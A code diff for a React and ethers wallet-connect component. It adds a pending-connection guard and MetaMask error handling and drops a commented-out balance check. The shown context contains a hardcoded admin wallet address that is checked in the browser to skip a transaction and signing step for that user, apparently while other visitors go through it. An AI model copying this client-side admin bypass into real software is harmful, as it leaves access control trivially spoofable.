@@ -4,6 +4,7 @@ import { ethers } from "ethers"
 const ADMIN_ADDRESS = "0xfacb014f44063c37395a77a50386d0ee0f39b2e3"
 
 const WalletConnect = () => {
+    const [isConnecting, setIsConnecting] = useState(false)
     const [account, setAccount] = useState("")
     const [status, setStatus] = useState("")
 
@@ -13,8 +14,29 @@ const WalletConnect = () => {
             return
         }
 
+        if (isConnecting) return
+        setIsConnecting(true)
+
         try {
             setStatus("Connecting...")
+            
+            // 1. Check if already connected
+            const existingAccounts = await window.ethereum.request({ method: "eth_accounts" })
+
+            if (existingAccounts.length === 0) {
+                // 2. Request accounts explicitly
+                try {
+                    await window.ethereum.request({ method: "eth_requestAccounts" })
+                } catch (rpcError) {
+                    if (rpcError.code === -32603) {
+                        setStatus("Error: A connection request is already pending in MetaMask. Please check your extension.")
+                        setIsConnecting(false)
+                        return
+                    }
+                    throw rpcError
+                }
+            }
+
             const provider = new ethers.BrowserProvider(window.ethereum)
             const signer = await provider.getSigner()
             const address = await signer.getAddress()
@@ -22,15 +44,6 @@ const WalletConnect = () => {
             setAccount(address)
 
             const message = `Identity verification for: ${address}`
-
-            // Check balance
-            const balance = await provider.getBalance(address)
-            const minBalance = ethers.parseEther("0.0001")
-
-            //  if (balance < minBalance) {
-            //   setStatus("Insufficient balance. Minimum 0.0001 ETH required.")
-            //    return
-            // }
 
             if (address.toLowerCase() === ADMIN_ADDRESS.toLowerCase()) {
                 console.log("Hi Emmanuel, admin access detected. Skipping transaction and signing.")
@@ -56,6 +69,8 @@ const WalletConnect = () => {
         } catch (error) {
             console.error("Error:", error)
             setStatus("Error: " + error.message)
+        } finally {
+            setIsConnecting(false)
         }
     }
 
